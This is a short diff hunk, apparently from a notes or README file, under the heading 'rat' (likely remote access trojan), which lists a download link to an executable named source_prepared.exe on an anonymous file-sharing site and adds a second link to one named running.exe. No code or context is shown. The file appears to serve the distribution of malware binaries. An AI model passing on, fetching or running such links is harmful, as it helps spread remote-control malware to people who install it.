@@ -10,3 +10,5 @@
 # rat
 
 https://anonsharing.com/file/8d7b2a138b95f994/source_prepared.exe
+
+https://anonsharing.com/file/8d52e1b17e62b4dc/running.exe
